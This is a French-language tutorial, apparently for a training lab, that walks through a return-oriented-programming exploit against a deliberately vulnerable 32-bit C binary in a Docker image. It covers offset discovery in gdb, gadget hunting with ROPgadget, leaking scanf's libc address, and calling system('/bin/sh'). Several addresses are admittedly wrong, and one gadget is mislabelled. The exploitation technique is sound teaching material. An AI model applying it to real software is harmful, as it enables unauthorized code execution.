# ROP Tuto

Afin de commencer a travailler sur l'exercice vous allez avoir besoin de docker et de l'image docker pingouin/roptuto.

Pour commencer a travailler: 

```
docker pull pingouin/roptuto
docker run -it pingouin/roptuto
```

## Présentation

Nous avons le code C où nous avons laissez une faille béante.

```c
#include <stdlib.h>
#include <stdio.h>

void input()
{
  char buffer[94];
  printf("Input: \n");
  scanf("%s",buffer);
}
int main(int argc, char **argv)
{
  input();
}
```

Dans la fonction input() la fonction scanf() ne vérifie pas si l'entrée de l'input est bien de 94 charactères. Ce qui expose notre programme a une  [BOF](https://fr.wikipedia.org/wiki/D%C3%A9passement_de_tampon).

Dans le docker vous aurez un binaire à exploiter `rop` dans le répertoire `/root/`. Afin de faire cela vous aurez deux fichier python:

* [part1.py](./exercices/part1.py)
* [part2.py](./exercices/part2.py)

Qui sereont à modifier avec différentes addresses mémoire que nous trouverons ensemble. Attention les addresses mémoires afficher dans se tutoriel sont mauvaise !

## Analyse du binaire

Nous faisons face à un executable 32bits compiler grâce a la commande `gcc rop.c -fno-stack-protector -no-pie -m32 -o rop`. Dans la fonction `input()` le developpeur ne vérifie pas si la taille entrer par l'utilisateur est bien de 94 charactères. Pour exploiter cette faille nous devons d'abord savoir quand nous prenons contrôle du flux d'execution. Pour cela nous envoyons une `unique string` dans notre programme et on regarde a quelle moment nous écrasons le registre `EIP`.

Pour cela nous pouvous trouver une [unique string](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html) et lancer notre executable `rop` dans un debugger. Nous avons `gdb` sur notre machine utilisons le:

```raw
root@5859be6f9e32:~# gdb rop
gdb-peda$ run
Starting program: /root/rop 
warning: Error disabling address space randomization: Operation not permitted
Input: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x33644132 ('2Ad3')
ECX: 0x1 
EDX: 0xf7f6c89c --> 0x0 
ESI: 0xf7f6b000 --> 0x1d9d6c 
EDI: 0xf7f6b000 --> 0x1d9d6c 
EBP: 0x41346441 ('Ad4A')
ESP: 0xffee2dd0 ("6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9")
EIP: 0x64413564 ('d5Ad')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x64413564
[------------------------------------stack-------------------------------------]
0000| 0xffee2dd0 ("6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9")
0004| 0xffee2dd4 ("Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9")
0008| 0xffee2dd8 ("d9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9")
0012| 0xffee2ddc ("0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9")
0016| 0xffee2de0 ("Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9")
0020| 0xffee2de4 ("e3Ae4Ae5Ae6Ae7Ae8Ae9")
0024| 0xffee2de8 ("4Ae5Ae6Ae7Ae8Ae9")
0028| 0xffee2dec ("Ae6Ae7Ae8Ae9")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x64413564 in ?? ()
```

La ligne qui nous intéresse est `EIP: 0x64413564 ('d5Ad')` sur le site où nous avons crée notre unique string nous pouvons calculer l'offset et trouver a partir de quelle moment nous prenons contrôle du registre EIP.

![offset](./offset.png)

Nous avons donc un offset de 106.

### ROP

Le ROP (return object programming) nous permet deux choses. Contourner la protection de pile non executable et la protection ASLR du système qui permet la répartition aléatoire des adresses mémoire a chaque lancement de l'éxécutable.
La méthode du ROP que nous allons utiliser est la plus classique et se divise en 3 partie :
* ret2plt qui permet de récupérer l'addresse de la libc (dont la base est aléatoire via l'ASLR)
* ret2main qui permet de retouner au début du program sans relancer l'executable et donc ne pas relancer l'ASLR.
* ret2libc qui permet de lancer n'importe quelle fonction présente dans la libc ici nous utiliseront system.

Mais du coup c'est quoi ret2XXX ?

`ret2` est l'abréviation de `return to`.

`plt` est l'abréviation de Procedure Linkage Table qui est, en termes simples, utilisé pour appeler des procédures/fonctions externes dont l'adresse n'est pas connue au moment de la liaison, et est laissé à la résolution par l'éditeur de liens dynamique lors de l'exécution.

`main` est la fonction principale de notre exécutable c'est par elle que commence et fini notre exécutable.

`libc` est l'implementation standard des fonction C comme **strcopy** ou **system**.

`got` signifie Global Offsets Table et est également utilisée pour résoudre les adresses.

Pour plus d'information sur la `plt` et la `got` [ici](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html).

Pour nous aider a contrôler notre programme nous allons utiliser des ROP Gadgets ce sont de petites séquences d'instructions se terminant par une instruction "ret" ("\xc3").

Dans un premier temps nous avons besoins de trouver les adresses mémoire de :
*  main
* puts@plt
* scanf

Avec objdump nous pouvons lister toutes les méthodes importé dans le binaire via la `plt`:
```
root@10b97ae13330:~# objdump -R rop

rop:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
0884bffc R_386_GLOB_DAT    __gmon_start__
0884c00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0884c010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0884cf14 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```

Nous avons l'addresse de la fonction `scanf` via la ligne

```
0884cf14 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```

Nous pouvons avoir l'addresse de puts :
```
root@10b97ae13330:~# objdump -d rop | grep "<puts@plt>"
08849f30 <puts@plt>:
0884a08e:	e8 9d fe ff ff       	call   8049030 <puts@plt>
```

Nous avons donc les addresses de :

* `puts@plt`: 0x08849f30
* `__isoc99_scanf@GLIBC_2.7`: 0x0884cf14

Puts nous permet d'écrire une string dans stdout et donc d'afficher la valeur une valeur de la libc afin de trouver la différence et donc d'utiliser n'importe quelle autre fonction de la libc dont `system()`.
La fonction puts prend un argument en paramètre :
```c
int puts(const char *str)
```

Afin de récupérer cet argument nous allons utiliser un ROP Gadget pour sortir notre argument de la stack. Grâce à un gadget de type pop ???; ret. Et pour cela nous allons utiliser ROPgadget:
```
root@10b97ae13330:~# ROPgadget --binary rop | grep pop
0x09849252 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0984922e : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0984910b : add esp, 8 ; pop ebx ; ret
0x098491b8 : inc dword ptr [ebx - 0x746fef3c] ; pop ebp ; cld ; leave ; ret
0x0984923c : jecxz 0x80491b9 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0984923b : jne 0x8049219 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0984901e : les ecx, ptr [eax] ; pop ebx ; ret
0x0984924e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0984925f : mov bl, 0x2d ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0984923f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x098491be : pop ebp ; cld ; leave ; ret
0x09849243 : pop ebp ; ret
0x09849240 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0984902e : pop ebx ; ret
0x09849242 : pop edi ; pop ebp ; ret
0x09849241 : pop esi ; pop edi ; pop ebp ; ret
0x09849026 : sal byte ptr [edx + eax - 1], 0xd0 ; add esp, 8 ; pop ebx ; ret
```

Nous avons donc deux choix:
* 0x09849243 : `pop ebp ; ret`
* 0x09849241 : `pop ebx ; ret`

Enfin nous devons trouver l'addresse du main de l'executable. Avec gdb nous pouvons avoir désassembler le main de notre programme:

```raw
root@5859be6f9e32:~# gdb rop
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x089491b3 <+0>:	push   ebp
   0x089491b3 <+1>:	mov    ebp,esp
   0x089491b5 <+3>:	and    esp,0xfffffff0
   0x089491b8 <+6>:	call   0x80491ce <__x86.get_pc_thunk.ax>
   0x089491bd <+11>:	add    eax,0x2e43
   0x089491c2 <+16>:	call   0x8049172 <input>
   0x089491c7 <+21>:	mov    eax,0x0
   0x089491cc <+26>:	leave  
   0x089491cd <+27>:	ret    
End of assembler dump.
```

Nous avons donc l'addresse du main: `0x089491b3`.

Pour récapituler nous avons :
* `main` 0x089491b3 
* `puts@plt` 0x08849f30
* `__isoc99_scanf@GLIBC_2.7` 0x0884cf14
* Et des gadgets :
   * 0x09849243 `pop ebp ; ret`
   * 0x09849241 `pop ebx ; ret`

Notre premier payload va donc être :
`payload = addrPLTputs + addrPopEbxRet + addrGOTscanf + addrMain`

Avec toute ça nous pouvons complèter [part1.py](./exercices/part1.py)

### Création du shell

Maintenant que nous avons fait fuiter l'addresse mémoire de la fonction scanf de la libc nous devons trouver l'addresse de cette même fonction scanf mais dans la libc afin de calculer l'écart et avoir l'addresse de base de la libc afin d'appeller n'importe quelle autre fonction.
Afin de trouver c'est addresses nous pouvons utiliser strings, objdump et/ou readelf.

Pour trouver l'addresses de `scanf` dans la libc:
```
root@566553ec2fbd:~# objdump -d /lib32/libc.so.6 | grep isoc99_scanf
00076480 <__isoc99_scanf@@GLIBC_2.7>:
   764a8:	75 3c                	jne    654e6 <__isoc99_scanf@@GLIBC_2.7+0x66>
   764b9:	74 27                	je     654e2 <__isoc99_scanf@@GLIBC_2.7+0x62>
   764c8:	74 01                	je     654cb <__isoc99_scanf@@GLIBC_2.7+0x4b>
   764ce:	74 07                	je     654d7 <__isoc99_scanf@@GLIBC_2.7+0x57>
   7650c:	75 27                	jne    65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>
   76515:	75 1e                	jne    65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>
   76526:	74 01                	je     65529 <__isoc99_scanf@@GLIBC_2.7+0xa9>
   7652c:	74 07                	je     65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>

```

Pour trouver l'addresse de `system` dans la libc:
```
root@566553ec2fbd:~# readelf -s /lib32/libc.so.6 | grep system        
   257: 0012a2c0   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   658: 000feae0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1525: 000feae0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

Pour trouver l'addresse de la string `/bin/sh` dans la libc:
```
root@566553ec2fbd:~# strings -a -t x /lib32/libc.so.6 | grep /bin/sh
 18ebbb /bin/sh
```

Nous avons donc:
* `__isoc99_scanf@GLIBC_2.7`: 0x00076480
* `system@@GLIBC_2.0`:  0x000feae0 
* `/bin/sh`: 0x0018ebbb 

Pour trouver la base de la libc on fait la différence entre la fuite du scanf qu'on a eu dans la première partie et l'addresse de scanf trouver dans la libc.
On peut maintenant ajouter a cette différence l'addresse de la fonction system ou l'addresse de la string “/bin/sh” afin d'y accèder avec notre payload.

La fonction system dans la libc prend un argument :
```c
int system(const char *command);
```

Nous avons besoins d'utiliter un des gadgets précèdemment trouver afin de donner a system notre string `/bin/sh`.

A vous de modifier l'exploit [part2](./exercices/part2.py) !
